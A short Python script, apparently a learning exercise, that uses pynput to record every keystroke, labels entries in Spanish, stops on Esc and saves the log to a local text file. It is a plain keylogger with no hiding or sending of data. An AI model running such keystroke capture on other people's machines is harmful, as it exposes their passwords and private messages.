from pynput import *

keyb_log = []

def on_press(key):
    keyb_log.append(f"Tecla pulsada: {key}")
                
def on_release(key):
        if key == keyboard.Key.esc:
            return False
        

listener = keyboard.Listener(
      on_press=on_press,
      on_release=on_release)
listener.start()

listener.join()

with open("log.txt", "w") as archivo:
    for registro in keyb_log:
        archivo.write(registro + "\n")

